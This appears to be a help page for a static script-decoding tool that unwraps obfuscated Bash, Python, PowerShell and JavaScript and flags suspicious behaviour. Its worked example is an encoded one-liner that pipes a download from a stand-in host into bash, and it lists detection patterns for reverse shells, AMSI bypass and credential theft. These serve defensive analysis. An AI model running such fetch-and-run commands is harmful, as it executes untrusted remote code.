# Script Decoder

> Unwrap obfuscated Python, Bash, PowerShell and JavaScript layer by layer, pull out indicators, and flag suspicious behavior. The script is parsed, never run.

**Sidebar group:** Analysis · **Works offline:** yes · **Needs admin rights:** no

## When to use it

- An EDR or firewall alert shows a `powershell -enc ...` command line and you need the decoded script.
- You found a one-liner such as `echo ... | base64 -d | bash` in a cron job or shell history and want to know what it runs.
- A Python dropper wraps its payload in several rounds of `exec(zlib.decompress(base64.b64decode(...)))`.
- A web page carries `eval(atob('...'))` or `String.fromCharCode` JavaScript and you need the URLs it contacts.

## Quick start

1. Open **Script Decoder** from the Analysis group.
2. Paste the script into the box, or click **Open file** (opening a file decodes it straight away).
3. Click **Decode** or press Cmd/Ctrl+Enter.
4. Read the summary line: how many layers were decoded, and how many indicators and flags were found.
5. Review **Flags** for behavior worth a closer look.
6. Copy **Indicators** (defanged by default) into your ticket or block list.
7. Expand each entry under **Layers** to read the decoded code. On a Bash layer, click **Explain** to see what each command, option and operator does.
8. Use **Export** for a report or to add it to a project.

## Inputs and options

| Field | What it means | Default / accepted values |
|---|---|---|
| Script | Source to decode. The language is detected per layer. | Python, Bash/POSIX sh, PowerShell, JavaScript. Up to 2,000,000 bytes. |
| Decode | Runs the static decoder. | Cmd/Ctrl+Enter in the box does the same. |
| Open file | Reads a file as text (never executes it) and decodes it. | `.py`, `.pyw`, `.sh`, `.bash`, `.zsh`, `.ps1`, `.psm1`, `.psd1`, `.js`, `.mjs`, `.cjs`, `.jse`, `.hta`, `.txt`, or any file. Up to 2,000,000 bytes. |
| Clear | Empties the box and results. | |
| defanged (Indicators) | Shows and copies indicators in defanged form. | On. |
| Copy all (Indicators) | Copies all indicators, one per line, in the form shown. | |
| Copy (per layer) | Copies that layer's displayed text. | |
| Explain (Bash layers) | Shows the layer broken into commands, options, operands, operators and redirections, each with a description. Click again to hide. | Off. |

What the decoder understands, by language:

- **Python**: a static evaluator for literals, concatenation, slicing, `chr`/`ord` joins and comprehensions, `bytes(...)`, and calls into `base64`, `binascii`, `codecs`, `zlib`, `gzip`, `lzma` and `marshal`. Payloads passed to `exec`, `eval` or `compile` become new layers.
- **Bash / sh**: emulates `echo`, `printf`, here-strings, `base64 -d`, `base32 -d`, `xxd -r -p`, `rev`, rot13 `tr`, `gunzip`, `xz -d` and `openssl base64 -d` in pipelines, and recognizes what runs the result (`| sh`, `eval`, `bash -c`, `source <(...)`, `python -c`).
- **PowerShell**: `-EncodedCommand` in any abbreviation, `[Convert]::FromBase64String(...)` with optional Gzip or Deflate streams and the text encoding used, `[char]` code arrays, and simple `$var = 'literal'` assignments. `IEX`, `Invoke-Expression`, `[scriptblock]::Create` and `.Invoke()` mark a payload as executed.
- **JavaScript**: `atob`, `unescape`, `decodeURIComponent`, `decodeURI`, `String.fromCharCode` and `String.fromCodePoint`, with `eval`, `Function`, `setTimeout`, `setInterval`, `execScript` and `document.write` treated as code sinks.

Underlying codecs include lenient Base64 (non-alphabet characters dropped, as Python does by default), Base32, Base16/hex, Base85, rot13, and zlib, gzip, raw deflate, xz and lzma decompression.

## Reading the results

**Summary line.** "No encoded layers found" or "N decoded layers", with counts of indicators and flags.

**Notes.** Shown when a limit was hit or something could not be fully handled, for example "Layer limit (32) reached; later payloads were not decoded.", "Layer N is at the depth limit (10); it was not decoded further." or "marshal bytecode is shown as a hex dump and strings; it is not disassembled."

**Flags** (heuristic, pattern matches only). Each flag has a badge (FAIL, WARN or INFO), a title, the layer and line, a description and the matching snippet. Examples:

- FAIL: "Downloads and runs code", "Reverse shell pattern", "Shellcode loader pattern", "Persistence mechanism", "Pipes a download into a shell", "PowerShell download and execute", "AMSI bypass", "Weakens Microsoft Defender", "Loads code in memory", "Windows Script Host objects", "Sends cookies or form data elsewhere", "Cryptocurrency miner", "Executes decoded code".
- WARN: "Reads credentials or secrets", "Runs shell commands", "Loads serialized code", "Deletes itself or cleans up traces", "Clears history or logs", "Runs a file from a temp directory", "Hidden or policy-bypassing PowerShell", "Node.js runs system commands", "Injects scripts or hidden frames", "Executes code that could not be decoded".
- INFO: "Anti-analysis checks", "Dynamic imports or attribute lookups", "XOR decoding loop", "Network access".

"Executes code that could not be decoded" means a sink runs an expression the decoder cannot evaluate statically: "Review it by hand."

**Indicators.** Type (URL, Domain, IPv4, Email, MD5, SHA1, SHA256, Path), the value (defanged or not), a **private** tag for internal addresses, and the layer it came from. Indicators are collected from every text layer.

**Layers.** Layer 0 is your input. Each later layer shows its number, its kind or language (Python, Bash, PowerShell, JavaScript, text, binary or marshal), the method that produced it (the decode chain, for example a Base64 then zlib step), which layer and line it came from, and its size. Decoded layers are open by default. Binary layers are shown as a hex dump of the first 4,096 bytes plus up to 500 printable strings. Very long layers are shortened on screen ("Shown text is shortened").

Example: pasting

```
echo Y3VybCAtcyBodHRwczovL2Nkbi5leGFtcGxlLmNvbS9hLnNoIHwgYmFzaA== | base64 -d | bash
```

gives one decoded Bash layer containing `curl -s https://cdn.example.com/a.sh | bash`, an indicator `hxxps://cdn[.]example[.]com/a.sh` and the domain `cdn[.]example[.]com`, and flags about what the layer runs.

**Explanation.** On a Bash layer, click **Explain** to break it down. The command line is shown with each part underlined, and every part is listed below it with a description. Hover over either to highlight the matching one.

- **command**: what the program does. Wrappers such as `sudo`, `env`, `nohup`, `timeout` and `xargs` are explained along with the command they run.
- **option**: each flag, including bundled flags like `-xzvf` (one line per letter) and the value an option takes, for example `-o out.bin`.
- **argument**, **operator**, **redirect**, **variable**, **keyword**: operands, `|` `&&` `;` `&`, redirections such as `2>&1` or `>/dev/null`, `NAME=value` assignments, and `if`, `for`, `case` and the like.
- Text that is itself run, such as `bash -c '...'`, `$(...)`, `eval`, `ssh host '...'` and `find -exec ... \;`, gets its own explanation nested under the item.
- Some items are marked **check**, for example `/dev/tcp/host/port`, a download or file piped straight into a shell, or `chmod` with setuid. A note above the line says why.

Descriptions come from a built-in list of common and security-relevant commands, then from the man pages on this computer (macOS and Linux), marked **man page**. Parts with no description are shown in italics. Windows has no man pages, so only the built-in list is used there. Only Bash and POSIX shell syntax is understood, not PowerShell or cmd.exe.

## What the results do and do not tell you

- Decoding is static: "the script was not executed". Only the listed constructs are evaluated; anything else stays as written and may be flagged as code that could not be decoded.
- Flags are "Pattern matches, not proof of intent". A clean result does not prove a script is safe, and a flag does not prove it is malicious.
- marshal bytecode is not disassembled.
- Limits: 2,000,000 bytes of input, 32 layers, nesting depth 10, 10 MB output per decode step (so decompression bombs stop), about 1,000,000 characters shown per layer, 2,000 indicators.

## Online activity and privacy

Nothing goes online and nothing in the script is executed, resolved or fetched. **Explain** reads local man pages with the `man` program to describe commands. The script is not saved unless you export or add to a project.

## Export and projects

The **Export** menu offers HTML, PDF, Markdown, Plain text, **Redacted...** and **Add to project**. See [Export and redaction](../export-and-redaction.md) and [Projects and notes](../projects-and-notes.md).

The report includes a summary (source, language of layer 0, decoded layer count, indicator and flag counts, and "Static decoding; the script was not executed"), notes, the heuristic flags with snippets, the indicators (always defanged), and every layer with its method, origin, size, text (up to 200,000 characters per layer) and strings. Because the report contains the decoded code, treat it as you would the sample.

## Platform notes

No differences between macOS, Windows and Linux.

## Troubleshooting

**"Paste a script or open a file."** The box is empty.

**"input is too large (... bytes, limit 2000000)" or "<file> is too large".** Trim the input to the relevant part.

**"No encoded layers found".** The script uses an obfuscation the decoder does not evaluate (for example custom functions or runtime values). Check the flags for "Executes code that could not be decoded", decode the payload by hand in the [Encoder Workbench](encoder-workbench.md), and paste the result back.

**A layer is binary instead of text.** The decoded data is not text, for example compressed data with an unrecognized format or a binary payload. Read the strings list, or try the [Encoder Workbench](encoder-workbench.md) on it.

## Related tools

- [Encoder Workbench](encoder-workbench.md) for manual decode chains.
- [IOC Extractor](ioc-extractor.md) for indicators in surrounding logs or reports.
- [Windows Event Log](event-log.md) to find PowerShell 4104 and process creation 4688 events that carry scripts.
- [Hash Calculator](hash-calculator.md) to hash a sample for reputation lookups elsewhere.
